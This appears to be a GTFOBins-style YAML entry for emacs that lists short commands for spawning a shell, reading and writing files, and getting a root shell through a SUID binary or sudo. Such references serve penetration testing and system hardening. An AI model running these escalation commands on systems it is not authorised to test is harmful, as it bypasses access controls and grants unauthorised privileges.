---
functions:
  shell:
    - code: emacs -Q -nw --eval '(term "/bin/sh")'
  file-write:
    - code: |
        emacs file_to_write
        DATA
        C-x C-s
  file-read:
    - code: emacs file_to_read
  suid:
    - code: ./emacs -Q -nw --eval '(term "/bin/sh -p")'
  sudo:
    - code: sudo emacs -Q -nw --eval '(term "/bin/sh")'
---
